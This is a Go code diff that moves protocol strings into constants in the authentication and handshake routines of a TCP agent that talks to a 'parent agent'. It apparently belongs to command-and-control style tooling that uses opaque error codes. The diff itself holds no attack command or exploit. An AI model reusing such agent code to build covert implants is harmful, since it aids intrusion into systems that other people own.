@@ -35,7 +35,7 @@ func performAuth(conn *TCPConnection) error {
 	}
 
 	// Step 4: Verify response format
-	expectedPrefix := []byte("AUTH:")
+	expectedPrefix := []byte(protoAuthPrefix)
 	if len(response) != len(expectedPrefix)+len(challenge) {
 		return fmt.Errorf(Err(E2))
 	}
@@ -53,7 +53,7 @@ func performAuth(conn *TCPConnection) error {
 	}
 
 	// Step 5: Send "OK" confirmation
-	if err := conn.WriteMessage([]byte("OK")); err != nil {
+	if err := conn.WriteMessage([]byte(protoAuthOk)); err != nil {
 		return fmt.Errorf(ErrCtx(E11, err.Error()))
 	}
 
@@ -80,8 +80,8 @@ func performHandshake(conn *TCPConnection, config map[string]string) error {
 
 	// Create handshake message to send through the parent agent
 	handshakeMsg := map[string]string{
-		"type":    "handshake",
-		"payload": encryptedPayload,
+		protoKeyType:    protoTypeHandshake,
+		protoKeyPayload: encryptedPayload,
 	}
 
 	msgJSON, err := json.Marshal(handshakeMsg)
@@ -108,12 +108,10 @@ func performHandshake(conn *TCPConnection, config map[string]string) error {
 			}
 
 			// Check if this is a ping message - if so, respond with pong and continue waiting
-			var msgCheck struct {
-				Type string `json:"type"`
-			}
+			var msgCheck map[string]interface{}
 			if err := json.Unmarshal(resp, &msgCheck); err == nil {
-				if msgCheck.Type == "ping" {
-					pongMsg := map[string]string{"type": "pong"}
+				if msgType, _ := msgCheck[protoKeyType].(string); msgType == protoTypePing {
+					pongMsg := map[string]string{protoKeyType: protoTypePong}
 					pongJSON, _ := json.Marshal(pongMsg)
 					conn.WriteMessage(pongJSON)
 					continue
@@ -130,19 +128,18 @@ func performHandshake(conn *TCPConnection, config map[string]string) error {
 	select {
 	case response := <-responseChan:
 		// NOTE: Parent agent sends "payload" (not "pl") for the payload field
-		var respEnvelope struct {
-			Type    string `json:"type"`
-			Payload string `json:"payload"`
-		}
+		var respEnvelope map[string]interface{}
 		if err := json.Unmarshal(response, &respEnvelope); err != nil {
 			return fmt.Errorf(ErrCtx(E18, err.Error()))
 		}
 
-		if respEnvelope.Type != "handshake_response" {
+		respType, _ := respEnvelope[protoKeyType].(string)
+		if respType != protoTypeHsResp {
 			return fmt.Errorf(Err(E2))
 		}
 
-		respBytes, err := base64.StdEncoding.DecodeString(respEnvelope.Payload)
+		respPayloadStr, _ := respEnvelope[protoKeyPayload].(string)
+		respBytes, err := base64.StdEncoding.DecodeString(respPayloadStr)
 		if err != nil {
 			return fmt.Errorf(ErrCtx(E18, err.Error()))
 		}
